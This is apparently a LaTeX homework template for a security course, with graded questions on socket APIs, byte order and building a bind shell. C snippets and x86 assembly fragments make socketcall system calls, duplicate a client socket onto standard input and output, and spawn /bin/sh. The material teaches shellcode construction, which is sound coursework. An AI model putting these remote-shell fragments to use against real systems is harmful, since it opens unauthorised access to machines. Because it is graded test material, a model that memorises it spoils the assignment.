\documentclass{article}[9pt]

\usepackage{listings}
\usepackage{fullpage}
\usepackage{textcomp}

\lstset{ %
  basicstyle=\ttfamily\small,
  commentstyle=\ttfamily\small\emph,
  upquote=true,
  framerule=1.25pt,
  breaklines=true,
  showstringspaces=false,
  escapeinside={(*@}{@*)},
  belowskip=2em,
  aboveskip=1em,
}


\newenvironment{answerfont}{\fontfamily{qhv}\selectfont}{\par}
\newenvironment{myanswer}{\begin{mdframed}\begin{answerfont}}{\end{answerfont}\end{mdframed}}


%%%%%%%%%%%%%%%%%%%%%%%%%%
% To add an answer, use the myanswer environment command under \item heading,like
%
% \item What is the meaning of life, universe, everything?
% \begin{mysanswer}
%   The answer is 42!
% \end{myanswer}
%
% You can also use macro's in your \myanswer if you want to control the
% formatting. Such as verbatim enviroment or lstlisting environment.
%
% BUT(!) I have to be able to read/grade your resulting pdf to give you credit,
% so make sure your home work is well formatted.
%%%%%%%%%%%%%%%%%%%%%%%%%%%

\title{SI485h: HW 05}
\date{FILL IN THE DUE DATE}
\author{FILL IN YOUR NAME}

\begin{document}

\maketitle
\section*{Instructions}

\begin{itemize}
\item You must submit your homework using this Latex template.
\item This homework is graded out of 80 points. Point values are associated to each question.
\end{itemize}

\section*{Questions}
\label{sec:org8c89f79}

\begin{enumerate}
\item For each of the socket programming API calls below, provide (a)
the arguments, (b) the return value, and (c) the function as
called to set up a reverse shell.

\begin{enumerate}
\item (3 points) \texttt{socket()}

\item (3 points) \texttt{bind()}

\item (3 points) \texttt{listen()}

\item (3 points) \texttt{accept()}
\end{enumerate}

\item (3 points) On most Intel, x86 machines, what is the difference between network and host byte order?

\item (5 points) Complete the code for the \texttt{struct sockaddr\_in} such that the host
will bind to address \texttt{192.168.2.1} on port 582.

\begin{verbatim}
struct sockaddr_in host_addr;
memset(&(host_addr), '\0', sizeof(struct sockaddr_in));
host_addr.sin_family= /* ... */;
host_addr.sin_port=/* ... */;
host_addr.sin_addr.s_addr=/* ... */;
\end{verbatim}

\item (5 points) Explain how the following code snippet connects the newly
connected client with the newly executed \texttt{/bin/sh}.

\begin{verbatim}
dup2(client, 0);
dup2(client, 1);
dup2(client, 2); 
\end{verbatim}

\item (5 points) Modify the code snippet below such that multiple clients can
connect to the remote shell such that a new shell is created for
each connecting client.

\begin{verbatim}
client = accept(server,
                (struct sockaddr *) &client_addr,
                &sin_size);

dup2(client, 0);
dup2(client, 1);
dup2(client, 2);
char *args[2]={"/bin//sh", NULL};
execve(args[0], args, NULL);
\end{verbatim}

\item For each of the socket API calls, translate them to their
\texttt{socketcall} equivalent. Yes, you may need to declare new
variables to do this or infer variable type information, such as
a \texttt{host\_addr} and \texttt{client\_addr} are of type \texttt{sockaddr\_in}.

\begin{enumerate}
\item (3 points) \texttt{sockfd = socket(AF\_INET, SOCK\_STREAM, IPPROTO\_IP)}

\item (3 points) \texttt{bind(sockfd, \&host\_addr, sizeof(struct sockaddr\_in))}

\item (3 points) \texttt{listen(sockfd,4)}

\item (3 points) \texttt{accept(sockfd, \&client\_addr, \&sin\_size)}
\end{enumerate}

\item (3 points) Why is it necessary to setup our own syscall method to perform
socketcall's?

\item Describe the socketcall arguments from the assembly code:

\begin{enumerate}
\item (5 points)

\begin{verbatim}
xor ecx,ecx
mov cl,0x2
push ecx
push esi ;sockfd
mov ecx, esp
xor ebx,ebx
mov bl, 0x4
xor eax,eax
mov al,0x66
int 0x80
\end{verbatim}

\item (5 points) 

\begin{verbatim}
xor ecx,ecx
push ecx
push ecx
push esi ;sockfd
mov ecx,esp
xor ebx,ebx
mov bl, 0x5
xor eax,eax
mov al,0x66
int 0x80
mov edi,eax
\end{verbatim}
\end{enumerate}
\begin{enumerate}
\item (5 points)

\begin{verbatim}
xor eax,eax
push eax
push 0x1
push 0x2
mov ecx,esp
xor ebx,ebx
mov bl,0x1
mov al,0x66
int 0x80
mov esi,eax
\end{verbatim}

\item (5 points)

\begin{verbatim}
xor eax,eax
push eax
push WORD 0xbeef
push WORD 0x02
mov ecx,esp
push 0x16
push ecx
push esi ;sockfd
xor ebx,ebx
mov bl,0x2
mov ecx,esp
mov al,0x66
int 0x80
\end{verbatim}
\end{enumerate}

\item (10 points) If register \texttt{edx} stores the value for the socket file
descriptor (\texttt{sockfd}), and \texttt{ecx} stores the value of an open file
descriptor. Write the \texttt{dup2()} code in assembly such that all the
standard file descriptors are from the shell will be duplicated
to the socket.
\end{enumerate}
\end{document}